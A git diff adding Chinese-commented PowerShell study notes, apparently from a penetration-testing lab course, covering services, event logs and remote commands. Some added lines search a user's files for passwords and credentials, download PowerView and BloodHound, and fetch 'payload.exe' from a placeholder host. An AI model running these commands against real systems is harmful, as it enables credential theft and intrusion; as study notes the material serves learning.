@@ -1,5 +1,7 @@
 # windows系统查看版本
 Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
+# 搜索和service相关的命令，在命令行里，get-help是查看帮助文档的命令,相当于linux的man
+Get-Help *-Service
 
 # 查看当前目录，相当于pwd
 Get-Location
@@ -102,5 +104,53 @@ Get-LocalUser administrator | Select-Object -Property *
 # 按照启用状态分组显示本地用户，group-object用于分组
 Get-LocalUser * | Sort-Object -Property Name | Group-Object -property Enabled
 
-# 查看Windows Defender服务状态，查找的是object
+# 查看Windows Defender服务状态，查找的是object，where是Get-ChildItem的alias
 Get-Service | where DisplayName -like '*Defender*'
+# 查找指定目录下的所有txt文件，-ErrorAction SilentlyContinue用于忽略错误信息，和linux的2>/dev/null类似，将stderr重定向到null
+Get-ChildItem -Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt")}
+# 使用多条件or查找多种文件类型
+Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}
+# 查找文件内的字符串，sls是select-string的alias，默认是不区分大小写的
+Get-ChildItem -Path C:\Users\MTanaka\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"
+
+# 查服务，ft是format-table的缩写，过滤显示指定字段
+Get-Service | ft DisplayName,Status
+# 启动 mdefend 服务
+Start-Service WinDefend
+# 停止
+Stop-Service Spooler
+
+# 查找到服务后，修改属性
+get-service spooler | Select-Object -Property Name, StartType, Status, DisplayName
+Set-Service -Name Spooler -StartType Disabled
+
+# 远程查看另一台主机的服务状态
+get-service -ComputerName ACADEMY-ICL-DC| Where-Object {$_.Status -eq "Running"}
+
+# 远程命令，通过Invoke-Command，执行远程命令，scriptblock里写命令
+invoke-command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}
+
+# 查看日志powershell中
+Get-WinEvent -ListLog *
+Get-WinEvent -ListLog Security # 指定日志名字为安全日志
+# 展开查看最近5条安全日志的详细信息, -MaxEvents 是指定最大事件数，Select-Object -ExpandProperty Message是展开消息属性
+Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message
+# 过滤查看事件ID为4625（失败登录事件）
+Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}
+# 检查系统日志中的严重错误(Level=1)
+Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message
+
+# 查看invoke-webrequest的属性和方法
+Invoke-WebRequest -Uri "https://xx.com" -Method GET | Get-Member
+Invoke-WebRequest -Uri "https://xx.com" -Method GET  -Method GET | fl Images # 查看图片信息
+Invoke-WebRequest -Uri "https://xx.com" -Method GET  -Method GET | fl RawContent # 查看原始内容
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1" # 下载文件
+
+# Net.WebClient 类似于Invoke-WebRequest,但更轻量级,下载文件
+$client = New-Object Net.WebClient
+$client.DownloadFile("https://xx.com/payload.exe","C:\Users\Public\payload.exe")
+# or写一起
+(New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")
+
+# 快速创建模块清单文件
+New-ModuleManifest -Path C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru
